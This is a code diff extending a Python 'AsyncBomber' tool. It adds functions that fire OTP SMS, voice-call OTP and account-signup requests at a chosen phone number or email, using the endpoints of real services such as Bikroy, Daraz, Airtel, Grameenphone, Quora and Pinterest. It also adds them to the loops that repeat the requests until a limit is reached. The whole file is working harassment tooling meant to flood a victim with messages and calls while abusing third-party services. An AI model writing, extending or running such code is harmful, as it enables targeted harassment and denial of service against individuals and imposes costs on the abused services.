@@ -269,6 +269,30 @@ class AsyncBomber:
             await self.log_event("API120 - PriyoShop OTP", False, "Error")
             return False
 
+    async def api_api121___bikroy_otp_v2(self):
+        target = self.target
+        url = "https://bikroy.com/data/authenticate/otp/send"
+        try:
+            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("API121 - Bikroy OTP V2", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("API121 - Bikroy OTP V2", False, "Error")
+            return False
+
+    async def api_api122___daraz_otp_v2(self):
+        target = self.target
+        url = "https://member.daraz.com.bd/user/api/sendOtp"
+        try:
+            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("API122 - Daraz OTP V2", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("API122 - Daraz OTP V2", False, "Error")
+            return False
+
     # Call APIs
 
     async def api_call1___robi_call_otp(self):
@@ -369,14 +393,62 @@ class AsyncBomber:
 
     async def api_call9___rokomari_call_otp(self):
         target = self.target
-        url = "https://www.rokomari.com/api/v1/auth/otp/send-voice"
+        url = "https://www.rokomari.com/api/v1/auth/otp/send"
         try:
-            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
+            async with self.session.post(url, json={"phone": target, "type": "voice"}, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
                 await self.log_event("CALL9 - Rokomari Call OTP", success, res.status)
                 return success
         except Exception:
             await self.log_event("CALL9 - Rokomari Call OTP", False, "Error")
+            return False
+
+    async def api_call10___airtel_call_otp(self):
+        target = self.target
+        url = "https://api.airtel.com.bd/vas/v1/otp/send"
+        try:
+            async with self.session.post(url, json={"msisdn": target, "type": "voice"}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL10 - Airtel Call OTP", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL10 - Airtel Call OTP", False, "Error")
+            return False
+
+    async def api_call11___gp_call_otp_v2(self):
+        target = self.target
+        url = "https://www.grameenphone.com/api/v1/otp/send"
+        try:
+            async with self.session.post(url, json={"phone": target, "method": "voice"}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL11 - GP Call OTP V2", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL11 - GP Call OTP V2", False, "Error")
+            return False
+
+    async def api_email49___quora_signup(self):
+        target = self.target
+        url = "https://www.quora.com/api/v1/auth/signup"
+        try:
+            async with self.session.post(url, json={"email": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201, 403]
+                await self.log_event("EMAIL49 - Quora Signup", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("EMAIL49 - Quora Signup", False, "Error")
+            return False
+
+    async def api_email50___pinterest_signup(self):
+        target = self.target
+        url = "https://www.pinterest.com/resource/UserRegisterResource/create/"
+        try:
+            async with self.session.post(url, data={"email": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("EMAIL50 - Pinterest Signup", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("EMAIL50 - Pinterest Signup", False, "Error")
             return False
 
     async def api_api1___redx_signup(self):
@@ -2413,17 +2485,18 @@ class AsyncBomber:
                 self.api_api1___redx_signup, self.api_api2___khaasfood_otp, self.api_api3___bioscope_login, self.api_api4___bikroy_phone_login, self.api_api5___proiojon_signup, self.api_api6___beautybooth_signup, self.api_api7___medha_otp, self.api_api8___deeptoplay_login, self.api_api9___robi_otp, self.api_api10___arogga_sms, self.api_api11___mygp_otp, self.api_api12___bdstall_otp, self.api_api13___bcs_exam_otp, self.api_api14___doctorlive_otp, self.api_api15___sheba_otp, self.api_api16___apex4u_login, self.api_api17___sindabad_otp, self.api_api18___kirei_otp, self.api_api19___shikho_sms, self.api_api20___circle_signup, self.api_api21___bdtickets_auth, self.api_api22___grameenphone_otp, self.api_api23___rfl_bestbuy_login, self.api_api24___chorki_login, self.api_api25___hishab_express_login, self.api_api26___chorcha_auth_check, self.api_api27___wafilife_otp, self.api_api28___robi_account_otp, self.api_api29___chardike_otp, self.api_api30___e_testpaper_otp, self.api_api31___gpay_signup, self.api_api32___applink_otp, self.api_api33___priyoshikkhaloy, self.api_api34___kabbik_otp, self.api_api35___salextra, self.api_api36___sundora, self.api_api37___mygp_cinematic, self.api_api38___bajistar, self.api_api39___doctime, self.api_api40___grameenphone_fi, self.api_api41___meenabazar, self.api_api42___medeasy, self.api_api43___iqra_live, self.api_api44___chokrojan, self.api_api45___shomvob, self.api_api46___redx_signup_2, self.api_api47___mygp_send_otp, self.api_api48___bdjobs, self.api_api49___ultimate_organic_register, self.api_api50___ultimate_organic_forget, self.api_api51___foodaholic, self.api_api52___kfc_bd, self.api_api53___gp_offer_otp, self.api_api54___eonbazar_register, self.api_api55___eat_z, self.api_api56___osudpotro, self.api_api57___kormi24, self.api_api58___weblogin_gp, self.api_api59___shwapno, self.api_api60___quizgiri, self.api_api61___banglalink_mybl, self.api_api62___walton_plaza, self.api_api63___pbs, self.api_api64___aarong, self.api_api65___arogga_app, self.api_api66___sundarban_courier, self.api_api67___quiztime, self.api_api68___dressup, self.api_api69___ghoori_learning, self.api_api70___garibook, self.api_api71___fabrilife_signup, self.api_api72___fabrilife_otp, self.api_api73___btcl_bdia, self.api_api74___btcl_phonebill_register, self.api_api75___btcl_phonebill_login, self.api_api76___redx_merchant_otp, self.api_api77___khaasfood_digits_otp, self.api_api78___robi_web_otp, self.api_api79___sindabad_offers_otp_v2, self.api_api80___gp_fi_fwa_otp, self.api_api81___kabbik_otp_v2, self.api_api82___sundora_otp_backend, self.api_api83___walton_plaza_otp_v2, self.api_api84___btcl_mybtcl_register, self.api_api85___btcl_mybtcl_bcare, self.api_api86___ecourier_individual_otp, self.api_api87___carrybee_merchant_register, self.api_api88___carrybee_forget_password, self.api_api89___cartup_signup, self.api_api90___easyfashion_digits_otp, self.api_api91___sara_lifestyle_otp, self.api_api92___electronics_bangladesh_otp, self.api_api93___esquire_electronics_check_user, self.api_api94___sheba_electronics_otp, self.api_api95___sumash_tech_otp, self.api_api96___volthbd_registration, self.api_api97___rangs_shop_otp, self.api_api98___eyecon_app_transport, self.api_api99___vision_emporium_register, self.api_api100___basa18_sms, self.api_api101___pkluck_register, self.api_api102___pkluck_nologin_otp, self.api_api103___8mbets_register, self.api_api104___8mbets_new_mobile_request, self.api_api105___8mbets_forget_tac, self.api_api106___jayabaji_register, self.api_api107___jayabaji_new_mobile_request, self.api_api108___jayabaji_login_tac,
                 self.api_api109___chaldal_otp, self.api_api110___pathao_otp, self.api_api111___sharetrip_otp, self.api_api112___shohoz_otp,
                 self.api_api113___foodpanda_otp, self.api_api114___hungrynaki_otp, self.api_api115___rokomari_otp, self.api_api116___evaly_otp,
-                self.api_api117___amarpay_otp, self.api_api118___pickaboo_otp, self.api_api119___ajkerdeal_otp, self.api_api120___priyoshop_otp
+                self.api_api117___amarpay_otp, self.api_api118___pickaboo_otp, self.api_api119___ajkerdeal_otp, self.api_api120___priyoshop_otp,
+                self.api_api121___bikroy_otp_v2, self.api_api122___daraz_otp_v2
             ]
         elif self.mode == 'call':
             apis = [
                 self.api_call1___robi_call_otp, self.api_call2___daraz_call_otp, self.api_call3___pathao_call_otp, self.api_call4___shohoz_call_otp,
                 self.api_call5___chaldal_call_otp, self.api_call6___foodpanda_call_otp, self.api_call7___evaly_call_otp, self.api_call8___hungrynaki_call_otp,
-                self.api_call9___rokomari_call_otp
+                self.api_call9___rokomari_call_otp, self.api_call10___airtel_call_otp, self.api_call11___gp_call_otp_v2
             ]
         else:
             apis = [
-                self.api_email1___bikroy_account, self.api_email2___bikroy_password_reset, self.api_email3___busbud_signup, self.api_email4___mithaibd_register, self.api_email5___saralifestyle_reset, self.api_email6___tohfay_register, self.api_email7___tohfay_forgot, self.api_email8___mrmedicinemart_signup, self.api_email9___mrmedicinemart_reset, self.api_email10___robishop_create, self.api_email11___robishop_reset, self.api_email12___singerbd_otp, self.api_email13___potakait_register, self.api_email14___electronicsbd_register, self.api_email15___electronicsbd_recovery, self.api_email16___globalbrand_register, self.api_email17___globalbrand_forgot, self.api_email18___zymak_register, self.api_email19___zymak_lost_password, self.api_email20___shopz_register, self.api_email21___shopz_lost_password, self.api_email22___xclusivebrands_register, self.api_email23___xclusivebrands_lost_password, self.api_email24___gamebuybd_register, self.api_email25___gamebuybd_lost_password, self.api_email26___gameforce_register, self.api_email27___gameforce_lost_password, self.api_email28___gamecastlebd_register, self.api_email29___gamecastlebd_lost_password, self.api_email30___techshopbd_signup, self.api_email31___electronicshopbd_ajax_register, self.api_email32___electronicshopbd_lost_password, self.api_email33___makersbd_register, self.api_email34___abe_register, self.api_email35___abe_forget_password, self.api_email36___colorcrazebd_signup, self.api_email37___colorcrazebd_reset, self.api_email38___chowdhuryelectronics_register, self.api_email39___smartview_register, self.api_email40___smartview_verify_resend, self.api_email41___smartview_password_code, self.api_email42___gadstyle_register, self.api_email43___gadstyle_lost_password, self.api_email44___havit_register, self.api_email45___havit_lost_password, self.api_email46___htebd_register, self.api_email47___htebd_lost_password, self.api_email48___shanbd_register
+                self.api_email1___bikroy_account, self.api_email2___bikroy_password_reset, self.api_email3___busbud_signup, self.api_email4___mithaibd_register, self.api_email5___saralifestyle_reset, self.api_email6___tohfay_register, self.api_email7___tohfay_forgot, self.api_email8___mrmedicinemart_signup, self.api_email9___mrmedicinemart_reset, self.api_email10___robishop_create, self.api_email11___robishop_reset, self.api_email12___singerbd_otp, self.api_email13___potakait_register, self.api_email14___electronicsbd_register, self.api_email15___electronicsbd_recovery, self.api_email16___globalbrand_register, self.api_email17___globalbrand_forgot, self.api_email18___zymak_register, self.api_email19___zymak_lost_password, self.api_email20___shopz_register, self.api_email21___shopz_lost_password, self.api_email22___xclusivebrands_register, self.api_email23___xclusivebrands_lost_password, self.api_email24___gamebuybd_register, self.api_email25___gamebuybd_lost_password, self.api_email26___gameforce_register, self.api_email27___gameforce_lost_password, self.api_email28___gamecastlebd_register, self.api_email29___gamecastlebd_lost_password, self.api_email30___techshopbd_signup, self.api_email31___electronicshopbd_ajax_register, self.api_email32___electronicshopbd_lost_password, self.api_email33___makersbd_register, self.api_email34___abe_register, self.api_email35___abe_forget_password, self.api_email36___colorcrazebd_signup, self.api_email37___colorcrazebd_reset, self.api_email38___chowdhuryelectronics_register, self.api_email39___smartview_register, self.api_email40___smartview_verify_resend, self.api_email41___smartview_password_code, self.api_email42___gadstyle_register, self.api_email43___gadstyle_lost_password, self.api_email44___havit_register, self.api_email45___havit_lost_password, self.api_email46___htebd_register, self.api_email47___htebd_lost_password, self.api_email48___shanbd_register, self.api_email49___quora_signup, self.api_email50___pinterest_signup
             ]
         while self.running and not self.stop_event.is_set():
             if self.limit != 0 and self.sent >= self.limit:
